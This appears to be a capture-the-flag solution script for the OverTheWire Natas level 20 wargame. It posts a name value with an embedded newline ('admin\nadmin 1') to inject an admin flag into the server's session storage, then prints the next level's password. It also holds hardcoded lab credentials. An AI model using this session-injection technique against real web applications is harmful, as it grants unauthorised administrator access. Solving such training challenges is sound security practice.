import requests


username = "natas20"
password = "eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF"


url = str("http://%s.natas.labs.overthewire.org/?debug=true" % username)
s=requests.Session()

r = s.post(url,data={'name':'admin\nadmin 1'},auth=(username, password))
print(r.text)

print("*"*90)

r = s.post(url,auth=(username, password))
print(r.text)




# the password natas21 : IFekPyrQXftziDEsUr3x21sYuahypdgJ
